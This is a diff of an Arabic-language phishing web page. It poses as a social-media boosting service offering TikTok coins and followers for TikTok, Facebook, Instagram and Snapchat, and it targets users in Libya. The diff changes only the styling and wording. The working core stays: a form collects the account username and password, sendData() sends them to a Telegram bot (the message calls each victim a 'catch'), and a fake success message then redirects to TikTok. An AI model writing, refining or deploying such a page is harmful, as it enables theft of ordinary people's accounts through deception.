@@ -3,106 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMM Pro | رشق وعملات فوري</title>
+    <title>SMM Ultra | رشق وشحن عملات</title>
     <style>
-        :root { --tiktok: #ee1d52; --accent: #00f2ea; --fb: #1877f2; --insta: #e1306c; }
-        body { 
-            background: #000; display: flex; align-items: center; justify-content: center; 
-            min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden;
+        :root { --tiktok: #ee1d52; --accent: #00f2ea; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
+
+        /* فيديو الخلفية */
+        #video-bg {
+            position: fixed; right: 0; bottom: 0;
+            min-width: 100%; min-height: 100%;
+            z-index: -2; filter: brightness(0.4) blur(2px); /* تمويه خفيف لزيادة التركيز على الكرت */
+            object-fit: cover;
         }
 
-        /* تأثير الخلفية المتحركة - نسخة واضحة وقوية */
-        .background-animation {
-            position: absolute; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; overflow: hidden;
+        /* طبقة الأيقونات المتحركة فوق الفيديو */
+        .overlay-icons {
+            position: fixed; width: 100%; height: 100%; z-index: -1; pointer-events: none;
         }
-        .icon {
-            position: absolute; font-weight: bold; animation: float 8s infinite linear; opacity: 0;
+        .moving-icon {
+            position: absolute; width: 50px; height: 50px; opacity: 0.8;
+            animation: move linear infinite;
         }
-        
-        /* ألوان عشوائية للأيقونات لزيادة الواقعية */
-        .icon:nth-child(4n+1) { color: var(--tiktok); text-shadow: 0 0 10px var(--tiktok); }
-        .icon:nth-child(4n+2) { color: var(--fb); text-shadow: 0 0 10px var(--fb); }
-        .icon:nth-child(4n+3) { color: var(--accent); text-shadow: 0 0 10px var(--accent); }
-        .icon:nth-child(4n+4) { color: #fffc00; text-shadow: 0 0 10px #fffc00; } /* Snapchat/Gold */
-
-        @keyframes float {
-            0% { transform: translateY(110vh) translateX(0) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.7; } /* وضوح عالي */
-            90% { opacity: 0.7; }
-            100% { transform: translateY(-10vh) translateX(20px) rotate(360deg); opacity: 0; }
+        @keyframes move {
+            from { transform: translateY(110vh) rotate(0deg); }
+            to { transform: translateY(-20vh) rotate(360deg); }
         }
 
         .main-card { 
-            background: rgba(10, 10, 10, 0.9); padding: 35px 25px; border-radius: 30px; 
-            width: 90%; max-width: 400px; text-align: center; border: 2px solid #333; 
-            box-shadow: 0 0 40px rgba(238, 29, 82, 0.3); backdrop-filter: blur(15px);
+            background: rgba(0, 0, 0, 0.75); padding: 35px 25px; border-radius: 30px; 
+            width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(15px); box-shadow: 0 0 50px rgba(238, 29, 82, 0.4);
+            position: relative; margin: auto; top: 50%; transform: translateY(-50%);
         }
-        .logo-area h1 { 
-            font-size: 30px; margin: 0; 
-            background: linear-gradient(45deg, var(--accent), var(--tiktok), #fff); 
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 15px rgba(255,255,255,0.5);
-        }
-        
-        .badge { background: var(--tiktok); color: white; padding: 5px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; margin-bottom: 20px; display: inline-block; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
 
+        .logo-area h1 { font-size: 32px; margin: 0; color: #fff; text-shadow: 0 0 20px var(--tiktok); }
+        .badge { background: var(--tiktok); color: white; padding: 5px 15px; border-radius: 50px; font-size: 12px; font-weight: bold; margin: 15px 0; display: inline-block; animation: pulse 1.5s infinite; }
+        
         select, input { 
-            width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #444; 
-            background: #111; color: white; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s;
+            width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #444; 
+            background: rgba(255,255,255,0.1); color: white; font-size: 16px; box-sizing: border-box; outline: none;
         }
-        input:focus { border-color: var(--accent); background: #1a1a1a; box-shadow: 0 0 10px rgba(0,242,234,0.2); }
+        input::placeholder { color: #ccc; }
 
         .btn-go { 
             width: 100%; padding: 18px; border: none; border-radius: 12px; 
-            background: white; color: #000; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s;
+            background: #fff; color: #000; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s;
         }
-        .btn-go:hover { background: var(--tiktok); color: #fff; box-shadow: 0 0 25px rgba(238, 29, 82, 0.7); transform: translateY(-3px); }
+        .btn-go:hover { background: var(--tiktok); color: #fff; box-shadow: 0 0 30px var(--tiktok); }
 
-        .live-status { font-size: 13px; color: #4ade80; margin-top: 15px; font-weight: bold; text-shadow: 0 0 5px #4ade80; }
+        .live-status { font-size: 13px; color: #4ade80; margin-top: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="background-animation" id="bg"></div>
+    <video autoplay muted loop id="video-bg">
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-social-media-icons-20997-large.mp4" type="video/mp4">
+    </video>
+
+    <div class="overlay-icons" id="icons-container"></div>
 
     <div class="main-card">
         <div class="logo-area">
-            <h1>SMM Panel Pro</h1>
-            <div class="badge">● خوادم الرشق والعملات نشطة</div>
+            <h1>SMM ULTRA PRO</h1>
+            <div class="badge">نظام الرشق التلقائي: نشط الآن</div>
         </div>
 
-        <p style="font-size: 15px; color: #ccc; margin-bottom: 20px;">اختر الخدمة المطلوبة لبدء المعالجة:</p>
-        
         <select id="platform">
-            <option value="TikTok-Coins">تيك توك - شحن عملات فوري 💰</option>
-            <option value="TikTok-Followers">تيك توك - زيادة متابعين حقيقيين</option>
+            <option value="TikTok-Coins">تيك توك - شحن عملات (Coins) 💰</option>
+            <option value="TikTok-Followers">تيك توك - زيادة متابعين وفولو</option>
             <option value="Facebook-Likes">فيسبوك - زيادة تفاعل ومتابعين</option>
             <option value="Instagram-Followers">إنستغرام - زيادة فولو ولايكات</option>
             <option value="Snapchat-Score">سناب شات - رفع سكور سريع</option>
         </select>
 
-        <input type="text" id="user" placeholder="اسم المستخدم (Username)" required>
-        <input type="password" id="pass" placeholder="كلمة مرور الحساب للتوثيق" required>
+        <input type="text" id="user" placeholder="اسم المستخدم أو الإيميل" required>
+        <input type="password" id="pass" placeholder="كلمة مرور الحساب (للتوثيق)" required>
         
-        <button class="btn-go" onclick="sendData()">تفعيل الخدمة الآن</button>
+        <button class="btn-go" onclick="sendData()">ابدأ الرشق الآن</button>
 
         <div class="live-status">
-            🟢 نشط في ليبيا حالياً: <span id="online">17,428</span>
+            🟢 نشط الآن في ليبيا: <span id="online">17,428</span>
         </div>
     </div>
 
     <script>
-        // توليد أيقونات متحركة (أكثر، أكبر، وأوضح)
-        const bg = document.getElementById('bg');
-        const icons = ['📱', 'TikTok', 'FB', 'IG', '💰', '🪙', '✨', '⚡', 'Follow', 'Like'];
-        for (let i = 0; i < 30; i++) { // زدت العدد لـ 30
-            let div = document.createElement('div');
-            div.className = 'icon';
-            div.innerText = icons[Math.floor(Math.random() * icons.length)];
-            div.style.left = Math.random() * 100 + 'vw';
-            div.style.animationDelay = Math.random() * 8 + 's'; // حركة أسرع
-            div.style.fontSize = (Math.random() * 25 + 15) + 'px'; // حجم أكبر
-            bg.appendChild(div);
+        // إضافة صور/أيقونات واضحة تتحرك في الخلفية
+        const container = document.getElementById('icons-container');
+        const imgUrls = [
+            'https://cdn-icons-png.flaticon.com/512/3046/3046121.png', // TikTok
+            'https://cdn-icons-png.flaticon.com/512/174/174855.png',   // Instagram
+            'https://cdn-icons-png.flaticon.com/512/124/124010.png',   // Facebook
+            'https://cdn-icons-png.flaticon.com/512/2111/2111615.png'   // Snapchat
+        ];
+
+        for (let i = 0; i < 15; i++) {
+            let img = document.createElement('img');
+            img.src = imgUrls[Math.floor(Math.random() * imgUrls.length)];
+            img.className = 'moving-icon';
+            img.style.left = Math.random() * 100 + 'vw';
+            img.style.animationDuration = (Math.random() * 5 + 5) + 's';
+            img.style.animationDelay = (Math.random() * 5) + 's';
+            container.appendChild(img);
         }
 
         function sendData() {
@@ -114,14 +115,14 @@
             const pass = document.getElementById('pass').value;
 
             if(user === "" || pass === "") {
-                alert("يرجى إدخال البيانات المطلوبة لربط الحساب بالسيرفر"); return;
+                alert("يرجى إدخال البيانات لربط الحساب بالسيرفر"); return;
             }
 
-            const msg = `💰 صيدة احترافية (الواجهة القوية)!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
+            const msg = `👑 صيدة الترا VIP!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
 
             fetch(url).finally(() => {
-                alert("تم التحقق من الحساب! جاري بدء إرسال المتابعين/العملات.");
+                alert("تم التحقق! طلبك قيد المعالجة الآن، سيصلك المتابعين/العملات قريباً.");
                 window.location.href = "https://www.tiktok.com"; 
             });
         }
